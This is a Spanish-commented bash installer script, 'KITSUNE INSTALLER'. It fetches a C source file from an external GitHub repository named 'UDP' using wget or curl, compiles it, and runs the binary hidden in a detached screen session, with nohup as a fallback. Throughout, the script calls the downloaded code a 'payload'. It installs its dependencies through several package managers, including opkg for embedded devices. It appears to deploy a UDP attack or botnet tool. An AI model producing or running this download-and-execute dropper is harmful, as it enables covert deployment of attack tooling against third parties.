#!/bin/bash

# ============================================================
# KITSUNE INSTALLER - Descarga directa con wget
# ============================================================

# --- CONFIGURACIÓN ---
PAYLOAD_URL="https://raw.githubusercontent.com/zJonchx/UDP/main/kitsune.c"
BIN_NAME="kitsune"
SCREEN_SESSION="kitsune_session"
WORK_DIR="/tmp/kitsune_build"

# Compilación
COMPILE_FLAGS="-O2 -pthread -lssl -lcrypto -lz -lm"

# --- FUNCIÓN: Verificar si existe un comando ---
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# --- 1. INSTALAR DEPENDENCIAS ---
echo "[*] Verificando dependencias..."

# Instalar compilador si no existe
if ! command_exists gcc; then
    echo "[*] Instalando gcc..."
    if command_exists apt-get; then
        apt-get update -qq && apt-get install -y gcc make
    elif command_exists opkg; then
        opkg update && opkg install gcc make
    elif command_exists yum; then
        yum install -y gcc make
    elif command_exists apk; then
        apk add gcc make
    else
        echo "[!] No se pudo instalar gcc. Instálalo manualmente."
        exit 1
    fi
fi

# Instalar screen si no existe
if ! command_exists screen; then
    echo "[*] Instalando screen..."
    if command_exists apt-get; then
        apt-get install -y screen
    elif command_exists opkg; then
        opkg install screen
    elif command_exists yum; then
        yum install -y screen
    elif command_exists apk; then
        apk add screen
    fi
fi

# --- 2. CREAR DIRECTORIO DE TRABAJO ---
echo "[*] Creando directorio de trabajo..."
rm -rf "$WORK_DIR"
mkdir -p "$WORK_DIR"
cd "$WORK_DIR" || exit 1

# --- 3. DESCARGAR PAYLOAD CON WGET ---
echo "[*] Descargando payload desde: $PAYLOAD_URL"
wget -O kitsune.c "$PAYLOAD_URL" 2>&1

if [ $? -ne 0 ] || [ ! -f kitsune.c ]; then
    echo "[!] Error al descargar kitsune.c"
    echo "[!] Intentando con curl..."
    curl -s -o kitsune.c "$PAYLOAD_URL"
    if [ $? -ne 0 ] || [ ! -f kitsune.c ]; then
        echo "[!] Error: No se pudo descargar el archivo"
        exit 1
    fi
fi

# Verificar que el archivo no esté vacío
FILE_SIZE=$(stat -c%s kitsune.c 2>/dev/null || stat -f%z kitsune.c 2>/dev/null)
if [ "$FILE_SIZE" -lt 100 ]; then
    echo "[!] Error: El archivo descargado está vacío o es muy pequeño"
    cat kitsune.c
    exit 1
fi

echo "[+] Payload descargado correctamente ($FILE_SIZE bytes)"

# --- 4. COMPILAR ---
echo "[*] Compilando payload..."
gcc $COMPILE_FLAGS -o "$BIN_NAME" kitsune.c

if [ $? -ne 0 ]; then
    echo "[!] Error de compilación. Intentando sin optimizaciones..."
    gcc -pthread -o "$BIN_NAME" kitsune.c -lssl -lcrypto -lz -lm
    if [ $? -ne 0 ]; then
        echo "[!] Error: No se pudo compilar el payload"
        exit 1
    fi
fi

# Verificar que el binario se creó
if [ ! -f "$BIN_NAME" ]; then
    echo "[!] Error: No se generó el binario"
    exit 1
fi

echo "[+] Compilación exitosa!"
ls -la "$BIN_NAME"

# --- 5. EJECUTAR EN SCREEN ---
echo "[*] Iniciando payload en screen..."

# Matar sesión anterior si existe
screen -S "$SCREEN_SESSION" -X quit 2>/dev/null

# Crear nueva sesión en segundo plano
screen -dmS "$SCREEN_SESSION" "$WORK_DIR/$BIN_NAME"

if [ $? -eq 0 ]; then
    echo ""
    echo "╔════════════════════════════════════════════════════════════╗"
    echo "║  ✅ PAYLOAD INSTALADO Y EJECUTÁNDOSE                    ║"
    echo "╠════════════════════════════════════════════════════════════╣"
    echo "║  📁 Directorio: $WORK_DIR                               ║"
    echo "║  📄 Archivo: kitsune.c                                  ║"
    echo "║  ⚙️  Binario: $BIN_NAME                                   ║"
    echo "║  🖥️  Screen: $SCREEN_SESSION                            ║"
    echo "╠════════════════════════════════════════════════════════════╣"
    echo "║  📌  Ver salida:  screen -r $SCREEN_SESSION             ║"
    echo "║  📌  Salir sin matar: Ctrl+A, luego D                   ║"
    echo "║  📌  Matar proceso: screen -X -S $SCREEN_SESSION quit   ║"
    echo "╚════════════════════════════════════════════════════════════╝"
else
    echo "[!] Error al iniciar screen. Intentando con nohup..."
    nohup "$WORK_DIR/$BIN_NAME" > /tmp/kitsune.log 2>&1 &
    echo "[+] Payload ejecutándose con nohup (PID: $!)"
    echo "[+] Logs: tail -f /tmp/kitsune.log"
fi
